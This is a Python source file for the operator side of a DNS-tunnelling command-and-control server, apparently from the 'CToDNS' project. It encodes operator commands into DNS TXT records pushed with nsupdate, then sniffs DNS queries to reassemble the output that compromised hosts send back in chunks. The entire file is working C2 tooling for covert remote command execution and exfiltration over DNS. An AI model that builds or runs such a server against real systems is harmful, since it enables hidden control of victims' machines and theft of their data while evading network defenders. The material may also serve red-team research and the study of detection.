import subprocess
import base64
from scapy.all import sniff, DNS
from termcolor import colored

DNS_SERVER = "X.X.X.X"
DOMAIN = "Your_DomainName.co.il"

def print_banner():
    banner = r"""
  ____ _____     ____  _   _ ____
 / ___|_   _|__ |  _ \| \ | / ___|
| |     | |/ _ \| | | |  \| \___ \
| |___  | | (_) | |_| | |\  |___) |
 \____| |_|\___/|____/|_| \_|____/
"""
    print(colored(banner, "cyan", attrs=["bold"]))
    print(colored("By ShkudW", "yellow", attrs=["bold"]))
    print(colored("https://github.com/ShkudW/CToDNS", "yellow", attrs=["bold"]))
    print("\n")

def update_txt_record(command):
    encoded_command = base64.b64encode(command.encode()).decode()
    nsupdate_cmds = f"""
server {DNS_SERVER}
update delete {DOMAIN} TXT
update add {DOMAIN} 60 TXT "{encoded_command}"
send
"""
    subprocess.run(
        ["nsupdate"], input=nsupdate_cmds, text=True, capture_output=True, check=True
    )

def sync_bind():
    subprocess.run(["rndc", "sync"], check=True)

def decode_fragmented_ascii(data):
    """
    Decodes Fragmented ASCII Representation to a string.
    """
    try:
        # Treat both 'a' and 'A' as separators, replace them with '-'
        reconstructed_data = data.replace("a", "-").replace("A", "-")
        ascii_values = [value for value in reconstructed_data.split("-") if value.isdigit()]
        decoded_string = "".join(chr(int(value)) for value in ascii_values if 0 <= int(value) <= 127)
        return decoded_string
    except Exception:
        return "Error decoding output"

def listen_for_dns_packets():
    chunks = {}
    unique_id = None
    expected_chunks = 0
    domain_lower = DOMAIN.lower()  # Convert the domain to lowercase for comparison

    while True:
        try:
            packet = sniff(filter="udp port 53", count=1, timeout=60)[0]
            if packet and packet.haslayer(DNS) and packet[DNS].qd:
                query_name = packet[DNS].qd.qname.decode()

                # Normalize the query name to lowercase for domain matching
                query_name = query_name.lower()

                if query_name.endswith(domain_lower):
                    # Remove the domain part from the query name
                    query_name = query_name[: -len(domain_lower) - 1]  # Remove also the trailing '.'

                if "start" in query_name:
                    unique_id = query_name.split("-")[0]
                    chunks.clear()
                    expected_chunks = 0
                elif "chunks" in query_name:
                    try:
                        expected_chunks = int(query_name.split("-")[1].replace("chunks", ""))
                    except ValueError:
                        pass
                elif "chunk" in query_name:
                    try:
                        chunk_index = int(query_name.split("-")[1].replace("chunk", ""))
                        chunk_data = query_name.split("-")[2]
                        if chunk_data:
                            chunks[chunk_index] = chunk_data
                    except Exception:
                        pass
                elif "end" in query_name:
                    if len(chunks) == expected_chunks:
                        try:
                            sorted_chunks = [chunks[i] for i in sorted(chunks.keys())]
                            full_data = "a".join(sorted_chunks)
                            cleaned_data = full_data.strip("a")
                            return decode_fragmented_ascii(cleaned_data)
                        except Exception:
                            return "Error decoding output"
                    else:
                        return "Incomplete data"
        except Exception:
            continue


if __name__ == "__main__":
    print_banner()
    print(colored("C2 Server Started. Type 'exit' to quit.", "yellow", attrs=["bold"]))
    while True:
        try:
            command = input("\nEnter command to execute: ")
            if command.lower() == "exit":
                print(colored("Exiting C2 Server.", "yellow", attrs=["bold"]))
                break

            update_txt_record(command)
            sync_bind()
            result = listen_for_dns_packets()

            print("\nCommand: ", colored(command, "cyan", attrs=["bold"]))
            print("Output: ", colored(result.split("|", 1)[-1].strip(), "green", attrs=["bold"]))
        except KeyboardInterrupt:
            print(colored("\nExiting C2 Server.", "yellow", attrs=["bold"]))
            break
